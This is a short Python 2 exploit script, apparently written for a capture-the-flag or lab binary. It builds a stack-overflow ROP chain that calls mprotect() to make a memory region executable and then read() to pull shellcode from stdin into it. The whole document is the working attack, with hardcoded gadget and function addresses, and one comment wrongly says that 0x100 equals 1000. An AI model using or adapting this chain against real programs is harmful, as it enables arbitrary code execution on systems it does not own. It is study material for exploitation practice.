import struct


def p(x):
    return struct.pack('<L', x)


mprotect = 0x80523e0
pop3ret = 0x8048882
read = 0x80517f0
# empty payload
payload = ""

#padding
payload += "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

#mark memory as rwx
payload += p(mprotect)          # EIP to mprotect()
payload += p(pop3ret)
payload += p(0x080ca000)        # address of beginning of rwx stack.
payload += p(0x1000)            # size
payload += p(0x7)               # mprotect() permissions;
                                # PROT_READ, PROT_WRITE, PROT_EXEC

# read shellcode from stdin

payload += p(read)              # Run read()
payload += p(0x080ca000)        # address of beginning of rwx stack.
payload += p(0x0)               # fd = STDIN
payload += p(0x080ca000)        # Place the shellcode into rwx stack.
payload += p(0x100)             # nbyte, count bytes, 0x0100 = 1000

 
print payload
